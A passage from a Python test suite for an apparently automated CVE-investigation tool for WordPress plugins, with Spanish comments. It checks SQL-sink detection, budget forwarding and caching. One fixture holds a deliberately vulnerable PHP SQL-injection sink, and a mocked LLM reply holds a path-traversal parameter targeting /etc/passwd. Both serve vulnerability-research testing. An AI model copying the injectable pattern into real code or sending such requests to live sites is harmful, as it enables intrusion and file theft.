    # 'w2dc_get_map_marker_info' (una consulta ya parametrizada con %d, segura) -- el sumidero
    # real sin saneo ('level_filter_where', un $_GET concatenado directo) estaba en OTRA parte
    # del codigo, nunca citada por el LLM ni el PoC. Esto debe encontrarlo solo y ponerlo
    # delante del analista, sin que haga falta pedirmelo a mano.
    from binoracle.workflows.cve_agent import Investigation, _attach_grounded_source_snippets

    sub = tmp_path / "classes" / "listings"
    sub.mkdir(parents=True)
    (sub / "listings_manager.php").write_text(
        "<?php\n"
        "public function level_filter_where($where = '') {\n"
        "    if (isset($_GET['w2dc_level_filter']) && $_GET['w2dc_level_filter'])\n"
        "        $where .= \" AND (w2dc_lr.level_id=\" . $_GET['w2dc_level_filter'] . \")\";\n"
        "    return $where;\n"
        "}\n")
    (tmp_path / "ajax_controller.php").write_text(
        "<?php\n"
        "function w2dc_get_map_marker_info() {\n"
        "    global $wpdb;\n"
        "    $row = $wpdb->get_row($wpdb->prepare(\"SELECT * FROM t WHERE id=%d\", 1));\n"
        "}\n")

    inv = Investigation(cve_id="CVE-2024-3552", vuln_class="sqli")
    inv.source_fetch = {"local_path": str(tmp_path), "plugin_dir": ""}
    inv.source_grounding = {"found": {"w2dc_get_map_marker_info": ["ajax_controller.php:2"]}}

    _attach_grounded_source_snippets(inv, es=True)

    assert any("level_filter_where" in b and "w2dc_level_filter" in b and "CANDIDATO MAS" in b
              for b in inv.blockers)


def test_investigate_cve_forwards_cli_budget_to_web_dynamic_verifier(monkeypatch, tmp_path):
    # bug real confirmado en vivo: --budget solo llegaba al camino --binary (plan_with_budget) --
    # cada verify_wordpress_*/verify_drupal_*/verify_joomla_* en _run_web_investigation ignoraba
    # por completo lo pedido por el analista y usaba siempre su propio default interno (1200s),
    # asi que el '--budget 300' de la CLI no tenia ningun efecto en una investigacion web real.
    import json as _json
    from binoracle.workflows import cve_agent, cvelookup, websource, wpverify

    plugin_dir = tmp_path / "some-plugin"
    plugin_dir.mkdir()
    (plugin_dir / "plugin.php").write_text("<?php\n// nada relevante\n")

    def fake_fetch_cve(cve_id, timeout=20.0, enrich=True):
        return cvelookup.CVEInfo(cve_id=cve_id, ok=True,
                                 description="Some plugin path traversal.", has_public_exploit=False)
    monkeypatch.setattr(cvelookup, "fetch_cve", fake_fetch_cve)
    monkeypatch.setattr(
        websource, "fetch_source",
        lambda *a, **kw: websource.SourceFetchResult(
            ok=True, kind="wordpress-plugin", source="some-plugin", resolved_version="1.0",
            local_path=str(plugin_dir), plugin_dir="some-plugin"))

    captured = {}

    def fake_verify_path_traversal(*args, **kwargs):
        captured["budget_s"] = kwargs.get("budget_s")
        return wpverify.WpVerifyResult(available=True, ok=True, verified=False,
                                       detail="no se confirmo")
    monkeypatch.setattr(wpverify, "verify_wordpress_path_traversal", fake_verify_path_traversal)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "vuln_class": "path-traversal", "source_url": "some-plugin",
                "endpoint": "/wp-admin/admin-ajax.php",
                "http_method": "POST", "parameters": {"file": "/etc/passwd"},
            })

    cve_agent.investigate_cve("CVE-2099-0099", config=object(), llm=_FakeLLM(),
                              on_step=lambda m: None, lang="es", budget_s=123.0)

    assert captured["budget_s"] == 123.0


def test_cache_path_for_requires_concrete_version():
    from binoracle.workflows.websource import _cache_path_for
    assert _cache_path_for("wordpress-plugin", "foo", "") is None
    assert _cache_path_for("wordpress-plugin", "foo", "1.2.3") is not None


def test_cache_path_for_disabled_via_flag(monkeypatch):
    import binoracle.workflows.websource as ws
    monkeypatch.setattr(ws, "_CACHE_DISABLED", True)
    assert ws._cache_path_for("wordpress-plugin", "foo", "1.2.3") is None


def test_save_and_copy_from_cache_round_trip(tmp_path):
    from binoracle.workflows.websource import _save_to_cache, _copy_from_cache
    source = tmp_path / "source_plugin"
    source.mkdir()
    (source / "plugin.php").write_text("<?php echo 1;")
    cache_path = tmp_path / "cache" / "foo" / "1.2.3"
    _save_to_cache(str(source), str(cache_path))
    assert cache_path.is_dir()
    assert (cache_path / "plugin.php").exists()

    dest = tmp_path / "dest"
    dest.mkdir()
    ok = _copy_from_cache(str(cache_path), str(dest), "foo")
    assert ok is True
    assert (dest / "foo" / "plugin.php").read_text() == "<?php echo 1;"


def test_fetch_wordpress_plugin_skips_zip_download_on_second_call(monkeypatch, tmp_path):
    # bug real a evitar (no uno ya visto en vivo, pero confirmado por diseno): un
    # investigate-batch corriendo varias CVEs del mismo plugin, o reintentando la misma CVE tras
    # arreglar un bug, volvia a bajar EL MISMO .zip de WordPress.org cada vez -- tiempo y ancho de
    # banda tirados sin necesidad.
    import io
    import json as _json
    import zipfile
    import binoracle.workflows.websource as ws

    monkeypatch.setattr(ws, "_CACHE_DIR", str(tmp_path / "cache"))
    monkeypatch.setattr(ws, "_CACHE_DISABLED", False)

    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as z:
        z.writestr("foo-plugin/foo-plugin.php", "<?php /* Plugin Name: Foo */")
    zip_data = zip_buf.getvalue()

    class _FakeHTTPResponse:
        def __init__(self, data):
            self._data = data
            self._pos = 0
        def read(self, n=-1):
            if n is None or n < 0:
                chunk = self._data[self._pos:]
                self._pos = len(self._data)
            else:
                chunk = self._data[self._pos:self._pos + n]
                self._pos += len(chunk)
            return chunk
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False

    calls = {"n": 0}
    def fake_urlopen(url, timeout=30.0):
        calls["n"] += 1
        if "api.wordpress.org" in url:
            info = {"versions": {"1.0.0": "https://downloads.wordpress.org/plugin/foo-plugin.1.0.0.zip"},
                    "download_link": "https://downloads.wordpress.org/plugin/foo-plugin.zip",
                    "version": "1.0.0"}
            return _FakeHTTPResponse(_json.dumps(info).encode())
        return _FakeHTTPResponse(zip_data)
    monkeypatch.setattr(ws, "_urlopen", fake_urlopen)

    r1 = ws.fetch_wordpress_plugin("foo-plugin", version="1.0.0")
    assert r1.ok is True
    calls_after_first = calls["n"]
    assert calls_after_first >= 2   # consulta de info + descarga del zip

    r2 = ws.fetch_wordpress_plugin("foo-plugin", version="1.0.0")
    assert r2.ok is True
    # la segunda vez, como mucho vuelve a consultar la API de info (hace falta para saber si
    # '1.0.0' sigue siendo una version real) -- nunca vuelve a bajar el .zip en si
    assert calls["n"] - calls_after_first <= 1
    assert (tmp_path / "cache" / "wordpress-plugin" / "foo-plugin" / "1.0.0" /
           "foo-plugin.php").exists()


def test_save_and_load_investigation_cache_round_trip(monkeypatch, tmp_path):
    from binoracle.workflows import cve_agent

    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DIR", str(tmp_path))
    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DISABLED", False)

    inv = cve_agent.Investigation(cve_id="CVE-2099-0001", description="desc", verified=True,
                                  vuln_class="sqli", llm_notes={"endpoint": "/x"})
    cve_agent.save_investigation_to_cache(inv)
    loaded = cve_agent.load_investigation_from_cache("CVE-2099-0001")
    assert loaded is not None
    assert loaded.description == "desc"
    assert loaded.verified is True
    assert loaded.llm_notes == {"endpoint": "/x"}

    # case-insensible: el id se normaliza igual que investigate_cve ya hace
    assert cve_agent.load_investigation_from_cache("cve-2099-0001") is not None


def test_load_investigation_cache_returns_none_when_disabled_or_missing(monkeypatch, tmp_path):
    from binoracle.workflows import cve_agent
    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DIR", str(tmp_path))
    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DISABLED", False)
    assert cve_agent.load_investigation_from_cache("CVE-2099-9999") is None   # nunca guardada

    inv = cve_agent.Investigation(cve_id="CVE-2099-0002")
    cve_agent.save_investigation_to_cache(inv)
    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DISABLED", True)
    assert cve_agent.load_investigation_from_cache("CVE-2099-0002") is None   # cache desactivada


def test_investigate_cve_reuses_cached_result_on_second_call(monkeypatch, tmp_path):
    # bug real a evitar (confirmado por diseno, igual que la cache de plugins): reinvestigar la
    # MISMA CVE desde cero cada vez repite pasos que no cambian -- sobre todo molesto con
    # investigate-batch reintentando un lote entero por una sola CVE que fallo.
    from binoracle.workflows import cve_agent, cvelookup

    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DIR", str(tmp_path))
    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DISABLED", False)

    calls = {"n": 0}
    def fake_fetch_cve(cve_id, timeout=20.0, enrich=True):
        calls["n"] += 1
        return cvelookup.CVEInfo(cve_id=cve_id, ok=True, description="desc", has_public_exploit=False)
    monkeypatch.setattr(cvelookup, "fetch_cve", fake_fetch_cve)

    inv1 = cve_agent.investigate_cve("CVE-2099-0003", config=object(), llm=None,
                                     on_step=lambda m: None, lang="es")
    assert calls["n"] == 1
    inv2 = cve_agent.investigate_cve("CVE-2099-0003", config=object(), llm=None,
                                     on_step=lambda m: None, lang="es")
    assert calls["n"] == 1   # la segunda vez NO volvio a consultar nada -- vino de la cache
    assert inv2.description == inv1.description


def test_investigate_cve_no_cache_forces_fresh_run(monkeypatch, tmp_path):
    from binoracle.workflows import cve_agent, cvelookup

    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DIR", str(tmp_path))
    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DISABLED", False)

    calls = {"n": 0}
    def fake_fetch_cve(cve_id, timeout=20.0, enrich=True):
        calls["n"] += 1
        return cvelookup.CVEInfo(cve_id=cve_id, ok=True, description="desc", has_public_exploit=False)
    monkeypatch.setattr(cvelookup, "fetch_cve", fake_fetch_cve)

    cve_agent.investigate_cve("CVE-2099-0004", config=object(), llm=None,
                             on_step=lambda m: None, lang="es")
    assert calls["n"] == 1
    cve_agent.investigate_cve("CVE-2099-0004", config=object(), llm=None,
                             on_step=lambda m: None, lang="es", use_cache=False)
    assert calls["n"] == 2   # --no-cache fuerza una investigacion fresca de verdad


def test_investigate_cve_skips_cache_when_hints_given(monkeypatch, tmp_path):
    # pasar hints/--source/--endpoint/etc. a mano cambia la pregunta -- reusar un resultado
    # cacheado de una investigacion SIN esos datos seria devolver la respuesta equivocada.
    from binoracle.workflows import cve_agent, cvelookup

    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DIR", str(tmp_path))
    monkeypatch.setattr(cve_agent, "_INVESTIGATION_CACHE_DISABLED", False)

    calls = {"n": 0}
    def fake_fetch_cve(cve_id, timeout=20.0, enrich=True):
        calls["n"] += 1
        return cvelookup.CVEInfo(cve_id=cve_id, ok=True, description="desc", has_public_exploit=False)
    monkeypatch.setattr(cvelookup, "fetch_cve", fake_fetch_cve)

    cve_agent.investigate_cve("CVE-2099-0005", config=object(), llm=None,
                             on_step=lambda m: None, lang="es")
    assert calls["n"] == 1
    cve_agent.investigate_cve("CVE-2099-0005", config=object(), llm=None,
                             on_step=lambda m: None, lang="es",
                             hints={"source_url": "some-slug"})
    assert calls["n"] == 2   # con hints, nunca se mira la cache
